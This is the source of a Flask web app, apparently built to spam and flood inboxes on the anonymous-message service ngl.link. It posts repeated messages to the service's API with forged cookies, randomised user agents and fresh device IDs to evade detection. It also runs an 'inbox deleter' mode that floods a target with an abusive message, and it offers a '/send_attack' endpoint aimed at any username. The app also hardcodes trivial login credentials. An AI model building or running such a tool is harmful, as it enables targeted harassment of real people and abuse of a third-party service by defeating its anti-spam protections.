from flask import Flask, request, render_template, redirect, url_for, session, jsonify
import requests
import uuid
import os
import random
import string
from functools import wraps
import time
from threading import Thread
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Generate a random key

users = {
    'testuser': 'password123',
    '1': '1',
}

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'username' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
@login_required
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Check credentials
        if users.get(username) == password:
            session['username'] = username
            return redirect(url_for('confirm_redirect'))
        else:
            return 'Invalid credentials', 401

    return render_template('login.html')

@app.route('/confirm_redirect')
@login_required
def confirm_redirect():
    return '''
        <script>
            if (confirm('Do you want to be redirected to a website?')) {
                window.location.href = '/redirect';
            } else {
                window.location.href = '/';
            }
        </script>
    '''

@app.route('/redirect')
@login_required
def redirect_url():
    target_url = 'https://h7ljvzns-5000.asse.devtunnels.ms/'
    return redirect(target_url)

def generate_random_user_agent():
    operating_systems = [
        "Windows NT 10.0", "Windows NT 6.1", "Windows NT 6.3",
        "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64",
        "Android 4.4.2", "Android 5.0", "Android 6.0", "Android 7.0",
        "Android 8.0", "Android 9.0", "Android 10.0", "Android 11.0",
        "Android 12.0", "CPU iPhone OS 14_7_1 like Mac OS X",
        "CPU iPhone OS 15_0 like Mac OS X",
    ]
    
    web_browsers = [
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
        "AppleWebKit/537.36 (KHTML, like Gecko) Firefox/91.0",
        "AppleWebKit/537.36 (KHTML, like Gecko) Edge/92.0.902.62",
    ]
    
    os = random.choice(operating_systems)
    browser = random.choice(web_browsers)
    
    user_agent = f"Mozilla/5.0 ({os}) {browser}"
    return user_agent

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def generate_cookie():
    distinct_id = generate_random_string(32)
    device_id = generate_random_string(32)
    initial_referrer = generate_random_string(8)
    initial_referring_domain = generate_random_string(8)
    
    cookie = (
        f"mp_e8e1a30fe6d7dacfa1353b45d6093a00_mixpanel=%7B%22distinct_id%22%3A%20%22{distinct_id}%22%2C"
        f"%22%24device_id%22%3A%20%22{device_id}%22%2C%22%24initial_referrer%22%3A%20%22{initial_referrer}%22%2C"
        f"%22%24initial_referring_domain%22%3A%20%22{initial_referring_domain}%22%7D;"
    )
    
    for _ in range(4):
        cookie += f" {generate_random_string(8)}={generate_random_string(40)};"
    
    return cookie.strip()

def send_spam(username, message, interval, max_spam, continuous, log_details):
    url = "https://ngl.link/api/submit"
    game = ['']

    start_time = datetime.now()
    for i in range(max_spam):
        gameslug = random.choice(game)
        random_cookie = generate_cookie()
        user_agent = generate_random_user_agent()
        
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/json",
            "Origin": "https://ngl.link",
            "Referer": f"https://ngl.link/{username}?_={random.randint(1, 100000)}",
            "User-Agent": user_agent,
            "Cookie": random_cookie
        }
        
        payload = {
            "username": username,
            "question": f"{gameslug} {message}",
            "deviceId": str(uuid.uuid4())
        }
        
        response = requests.post(url, headers=headers, json=payload)
        status = 'Success' if response.status_code == 200 else 'Failed'
        log_details.append({
            'index': i + 1,
            'status': status,
            'time': datetime.now().strftime("%H:%M:%S")
        })
        
        time.sleep(int(interval))
        
        if not continuous:
            break

    return log_details

def continuous_deleter(username, duration, log_details):
    url = "https://ngl.link/api/submit"
    message = "function(deleter):____reset(fuck_you_)"

    end_time = datetime.now() + timedelta(seconds=duration)
    
    while datetime.now() < end_time:
        random_cookie = generate_cookie()
        user_agent = generate_random_user_agent()
        
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/json",
            "Origin": "https://ngl.link",
            "Referer": f"https://ngl.link/{username}?_={random.randint(1, 100000)}",
            "User-Agent": user_agent,
            "Cookie": random_cookie
        }
        
        payload = {
            "username": username,
            "question": message,
            "deviceId": str(uuid.uuid4())
        }
        
        response = requests.post(url, headers=headers, json=payload)
        status = 'Success' if response.status_code == 200 else 'Failed'
        log_details.append({
            'status': status,
            'time': datetime.now().strftime("%H:%M:%S")
        })
        
        time.sleep(1)  # Small delay between requests

    return log_details

@app.route('/send_attack', methods=['POST'])
@login_required
def send_attack():
    username = request.form['username']
    message_type = request.form['message_type']
    custom_message = request.form.get('custom_message', '')
    interval = request.form['interval']
    continuous = 'continuous' in request.form
    max_spam = random.randint(30, 50)

    if '@' in username:
        return jsonify({'error': 'Hinde kaba nag babasa?? Sinabi ko na huwag na mag lagay ng @ sa username'}), 400

    log_details = []
    start_time = datetime.now().strftime("%H:%M:%S")
    approx_end_time = (datetime.now() + timedelta(seconds=int(interval) * max_spam)).strftime("%H:%M:%S")

    if message_type == 'custom':
        message = custom_message
    elif message_type == 'crash':
        duration = random.randint(60, 120)  # 1 to 2 minutes
        Thread(target=continuous_deleter, args=(username, duration, log_details)).start()
        return jsonify({
            'message': 'Inbox deleter attack started!',
            'username': username,
            'attack_type': message_type,
            'start_time': start_time,
            'approx_end_time': approx_end_time,
            'spam_count': 'N/A',
            'log_details': log_details
        }), 200
    else:
        message = message_type + ' Spam'
        Thread(target=send_spam, args=(username, message, interval, max_spam, continuous, log_details)).start()

    return jsonify({
        'message': 'Spam attack started!',
        'username': username,
        'attack_type': message_type,
        'start_time': start_time,
        'approx_end_time': approx_end_time,
        'spam_count': max_spam,
        'log_details': log_details
    }), 200

if __name__ == '__main__':
    app.run(debug=False)
